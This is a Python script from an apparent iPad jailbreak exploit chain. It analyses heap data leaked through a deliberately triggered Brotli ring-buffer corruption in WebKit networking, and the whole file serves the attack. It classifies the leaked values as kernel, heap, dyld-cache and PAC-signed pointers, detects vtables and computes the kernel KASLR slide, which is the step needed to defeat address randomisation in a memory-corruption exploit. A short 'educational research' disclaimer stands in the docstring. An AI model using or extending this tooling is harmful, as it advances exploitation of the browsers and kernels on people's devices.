#!/usr/bin/env python3
"""Analyze leaked data from Brotli ring buffer corruption.

When the auto-spray groom page runs on iPad, the poison streams
cause Brotli to process stale heap data through ring buffer reuse.
The corrupted output bytes are reported to /probe/readback as hex.

This script analyzes those bytes to find:
1. Heap pointers (libmalloc metadata)
2. Mach-O pointers (dyld shared cache, WebKit.Networking)
3. Kernel pointers (if kernel data leaked via shared mapping)
4. vtable pointers (C++ objects adjacent to ring buffer)
5. PAC-signed pointers (top bits contain PAC signature)

Educational jailbreak research only. For use on devices you own.
"""

import struct
import sys
import json

# arm64e pointer ranges
KERNEL_BASE       = 0xFFFFFE0007004000  # unslid kernel base
KERNEL_RANGE      = (0xFFFFFE0000000000, 0xFFFFFF0000000000)
DYLD_CACHE_RANGE  = (0x180000000, 0x280000000)  # typical dyld shared cache
HEAP_RANGE        = (0x100000000, 0x180000000)   # typical userspace heap
STACK_RANGE       = (0x16F000000, 0x170000000)   # typical stack region
IOKIT_RANGE       = (0xFFFFFE0000000000, 0xFFFFFF0000000000)

# PAC signature bits (top 16 bits on A17 Pro with 48-bit VA)
PAC_MASK = 0xFFFF000000000000

# WebKit.Networking interesting objects
WEBKIT_SIGNATURES = {
    b'\x57\x65\x62\x4b\x69\x74': 'WebKit string',
    b'\x4e\x65\x74\x77\x6f\x72\x6b': 'Network string',
    b'\x42\x72\x6f\x74\x6c\x69': 'Brotli string',
    b'\x48\x54\x54\x50': 'HTTP string',
}

# libmalloc magazine zone markers
MALLOC_MARKERS = {
    0xDEADCAFE: 'freed magazine slot',
    0xDEADBEEF: 'debug marker',
    0xFEEDFACE: 'Mach-O header (32-bit)',
    0xFEEDFACF: 'Mach-O header (64-bit)',
    0xBEBAFECA: 'Fat binary magic',
}


def classify_pointer(val):
    """Classify a 64-bit value as a pointer type."""
    results = []

    # Kernel pointers use full 64-bit address space (sign-extended)
    # Check raw value first before PAC stripping
    if KERNEL_RANGE[0] <= val <= KERNEL_RANGE[1]:
        slide = (val - KERNEL_BASE) & ~0x3FFF
        results.append(f'KERNEL ptr (slide=0x{slide:x})')

    # Strip PAC bits for userspace pointer classification
    # On arm64e with 48-bit VA, bits 63:48 contain PAC for user ptrs
    stripped = val & ~PAC_MASK
    pac_bits = (val >> 48) & 0xFFFF

    if DYLD_CACHE_RANGE[0] <= stripped <= DYLD_CACHE_RANGE[1]:
        results.append(f'dyld_shared_cache ptr')

    if HEAP_RANGE[0] <= stripped <= HEAP_RANGE[1]:
        results.append(f'heap ptr')

    if STACK_RANGE[0] <= stripped <= STACK_RANGE[1]:
        results.append(f'stack ptr')

    # PAC signature: nonzero top bits on userspace pointer
    if pac_bits != 0 and pac_bits != 0xFFFF and not results:
        # Only flag as PAC-signed if it looks like a user pointer with PAC
        if DYLD_CACHE_RANGE[0] <= stripped <= DYLD_CACHE_RANGE[1] or \
           HEAP_RANGE[0] <= stripped <= HEAP_RANGE[1]:
            results.append(f'PAC-signed (sig=0x{pac_bits:04x})')
        elif stripped > 0x100000:
            results.append(f'PAC-signed (sig=0x{pac_bits:04x})')

    # Check 32-bit values in both halves
    lo32 = val & 0xFFFFFFFF
    hi32 = (val >> 32) & 0xFFFFFFFF
    for half, label in [(lo32, 'lo'), (hi32, 'hi')]:
        if half in MALLOC_MARKERS:
            results.append(f'{label}32: {MALLOC_MARKERS[half]}')

    return results


def analyze_hex(hex_str):
    """Analyze hex string from /probe/readback endpoint."""
    try:
        data = bytes.fromhex(hex_str.strip())
    except ValueError:
        print(f"[-] Invalid hex string")
        return

    print(f"[*] Analyzing {len(data)} bytes of leaked data\n")

    # Phase 1: Scan for 64-bit pointers
    print("=== 64-bit Pointer Scan ===")
    findings = []
    for offset in range(0, len(data) - 7, 8):
        val = struct.unpack_from('<Q', data, offset)[0]
        if val == 0:
            continue

        classes = classify_pointer(val)
        if classes:
            findings.append((offset, val, classes))
            print(f"  +0x{offset:04x}: 0x{val:016x}  [{', '.join(classes)}]")

    if not findings:
        print("  (no recognizable pointers found)")

    # Phase 2: Scan for vtable-like patterns (consecutive pointers in same region)
    print(f"\n=== vtable Detection ===")
    vtable_runs = []
    consecutive = 0
    run_start = 0
    prev_region = None

    for offset in range(0, len(data) - 7, 8):
        val = struct.unpack_from('<Q', data, offset)[0]
        stripped = val & ~PAC_MASK

        if DYLD_CACHE_RANGE[0] <= stripped <= DYLD_CACHE_RANGE[1]:
            curr_region = 'dyld_cache'
        elif KERNEL_RANGE[0] <= stripped <= KERNEL_RANGE[1]:
            curr_region = 'kernel'
        else:
            curr_region = None

        if curr_region and curr_region == prev_region:
            consecutive += 1
        else:
            if consecutive >= 3:
                vtable_runs.append((run_start, offset, consecutive, prev_region))
            consecutive = 1
            run_start = offset
            prev_region = curr_region

    if consecutive >= 3:
        vtable_runs.append((run_start, offset, consecutive, prev_region))

    for start, end, count, region in vtable_runs:
        print(f"  +0x{start:04x}-0x{end:04x}: {count} consecutive {region} ptrs (likely vtable)")

    if not vtable_runs:
        print("  (no vtable-like runs detected)")

    # Phase 3: Scan for interesting strings
    print(f"\n=== String Detection ===")
    for sig, label in WEBKIT_SIGNATURES.items():
        idx = data.find(sig)
        while idx >= 0:
            context = data[max(0, idx-4):idx+len(sig)+16]
            print(f"  +0x{idx:04x}: {label} -> {context!r}")
            idx = data.find(sig, idx + 1)

    # Phase 4: Entropy analysis (high-entropy regions = random/encrypted data)
    print(f"\n=== Entropy Analysis (64-byte blocks) ===")
    for block_start in range(0, len(data), 64):
        block = data[block_start:block_start + 64]
        if len(block) < 64:
            break

        # Simple byte distribution check
        unique = len(set(block))
        zeros = block.count(0)
        ff_count = block.count(0xFF)

        if unique > 50:
            print(f"  +0x{block_start:04x}: HIGH entropy ({unique} unique bytes) — possible encrypted/random data")
        elif zeros > 48:
            print(f"  +0x{block_start:04x}: ZERO block ({zeros}/64 zeros)")
        elif unique < 8:
            print(f"  +0x{block_start:04x}: LOW entropy ({unique} unique) — possible padding/fill pattern")

    # Phase 5: KASLR slide estimation
    print(f"\n=== KASLR Slide Estimation ===")
    kernel_ptrs = []
    for offset, val, classes in findings:
        for c in classes:
            if 'KERNEL' in c:
                stripped = val & ~PAC_MASK
                kernel_ptrs.append(stripped)

    if kernel_ptrs:
        slides = set()
        for p in kernel_ptrs:
            # Kernel slide is typically page-aligned (0x4000 granularity)
            potential_slide = (p - KERNEL_BASE) & ~0x3FFF
            if 0 <= potential_slide <= 0x20000000:  # max ~512MB slide
                slides.add(potential_slide)

        if slides:
            for s in sorted(slides):
                print(f"  Possible kernel slide: 0x{s:x}")
                print(f"  -> kernel base would be: 0x{KERNEL_BASE + s:x}")
        else:
            print("  (kernel pointers found but no consistent slide)")
    else:
        print("  (no kernel pointers to estimate slide from)")

    # Summary
    print(f"\n=== Summary ===")
    print(f"  Total bytes: {len(data)}")
    print(f"  Pointer-like values: {len(findings)}")
    print(f"  vtable runs: {len(vtable_runs)}")
    print(f"  Kernel pointers: {len(kernel_ptrs)}")

    return {
        'bytes': len(data),
        'pointers': len(findings),
        'vtables': len(vtable_runs),
        'kernel_ptrs': len(kernel_ptrs),
        'findings': [(o, hex(v), c) for o, v, c in findings],
    }


def analyze_readback_json(json_str):
    """Analyze JSON from /probe/readback POST body."""
    try:
        report = json.loads(json_str)
    except json.JSONDecodeError:
        print("[-] Invalid JSON")
        return

    print(f"[*] Readback report:")
    print(f"  Session: {report.get('session', 'unknown')}")
    print(f"  Corrupted slots: {report.get('corrupted', [])}")
    print(f"  Phase: {report.get('phase', 'unknown')}")

    for slot_data in report.get('hex_data', []):
        slot = slot_data.get('slot', '?')
        hex_val = slot_data.get('hex', '')
        print(f"\n--- Slot {slot} ---")
        analyze_hex(hex_val)


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <hex_string|json_file>")
        print(f"  hex_string: raw hex from /probe/readback")
        print(f"  json_file:  JSON report from auto-spray page")
        sys.exit(1)

    arg = sys.argv[1]

    if arg.endswith('.json'):
        with open(arg) as f:
            analyze_readback_json(f.read())
    else:
        analyze_hex(arg)
